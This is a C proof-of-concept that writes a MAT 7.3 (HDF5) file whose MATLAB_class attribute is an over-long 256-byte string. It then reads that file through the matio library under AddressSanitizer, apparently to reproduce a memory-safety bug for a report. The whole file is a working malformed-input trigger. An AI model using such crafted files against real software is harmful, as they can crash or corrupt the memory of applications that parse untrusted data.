/* PoC: MAT 7.3 (HDF5) file with an over-long MATLAB_class attribute.
 *
 * The file created here stores the class of variable "x" as a single
 * fixed-length string of 256 bytes. The variable is then read through
 * the public matio API (Mat_Open + Mat_VarReadNext).
 *
 * Build: h5cc -fsanitize=address -I<srcdir>/src -I<builddir>/src \
 *            newbug.c -o newbug -L<builddir> -lmatio
 * Run:   ./newbug [file.mat]
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <hdf5.h>

#include "matio.h"

#define POC_CLASS_LEN 256

static void
write_header(const char *path)
{
    FILE *fp = fopen(path, "r+b");
    char hdr[128];
    unsigned short version = 0x0200;
    unsigned short endian = 0x4d49;

    if ( NULL == fp )
        exit(2);
    memset(hdr, ' ', sizeof(hdr));
    memcpy(hdr, "MATLAB 7.3 MAT-file, Platform: poc, Created by: poc HDF5 schema 0.5", 66);
    memcpy(hdr + 124, &version, 2);
    memcpy(hdr + 126, &endian, 2);
    fseek(fp, 0, SEEK_SET);
    fwrite(hdr, 1, 128, fp);
    fclose(fp);
}

static void
create_poc_file(const char *path)
{
    hid_t plist_id, plist_ap, fid, space_id, dset_id, type_id, attr_space_id, attr_id;
    char *class_name;

    plist_id = H5Pcreate(H5P_FILE_CREATE);
    H5Pset_userblock(plist_id, 512);
    plist_ap = H5Pcreate(H5P_FILE_ACCESS);
#if H5_VERSION_GE(1, 10, 2)
    H5Pset_libver_bounds(plist_ap, H5F_LIBVER_EARLIEST, H5F_LIBVER_V18);
#endif
    fid = H5Fcreate(path, H5F_ACC_TRUNC, plist_id, plist_ap);
    H5Pclose(plist_id);
    H5Pclose(plist_ap);
    if ( fid < 0 )
        exit(2);

    space_id = H5Screate(H5S_SCALAR);
    dset_id = H5Dcreate2(fid, "x", H5T_NATIVE_DOUBLE, space_id, H5P_DEFAULT, H5P_DEFAULT,
                         H5P_DEFAULT);
    H5Sclose(space_id);

    type_id = H5Tcopy(H5T_C_S1);
    H5Tset_size(type_id, POC_CLASS_LEN);
    H5Tset_strpad(type_id, H5T_STR_NULLPAD);
    class_name = (char *)calloc(POC_CLASS_LEN, 1);
    memcpy(class_name, "double", 6);
    attr_space_id = H5Screate(H5S_SCALAR);
    attr_id = H5Acreate2(dset_id, "MATLAB_class", type_id, attr_space_id, H5P_DEFAULT, H5P_DEFAULT);
    H5Awrite(attr_id, type_id, class_name);
    H5Aclose(attr_id);
    H5Sclose(attr_space_id);
    H5Tclose(type_id);
    free(class_name);

    H5Dclose(dset_id);
    H5Fclose(fid);
    write_header(path);
}

int
main(int argc, char **argv)
{
    const char *path = (argc > 1) ? argv[1] : "poc_longclass.mat";
    int force_create = (argc > 2 && 0 == strcmp(argv[2], "--create"));
    mat_t *mat;
    matvar_t *matvar;

    if ( force_create || 0 != access(path, F_OK) )
        create_poc_file(path);

    mat = Mat_Open(path, MAT_ACC_RDONLY);
    if ( NULL == mat ) {
        printf("Mat_Open failed\n");
        return 1;
    }
    printf("opened %s\n", path);
    while ( NULL != (matvar = Mat_VarReadNext(mat)) ) {
        printf("read var %s class=%d\n", NULL != matvar->name ? matvar->name : "(null)",
               matvar->class_type);
        Mat_VarFree(matvar);
    }
    Mat_Close(mat);
    printf("done\n");
    return 0;
}
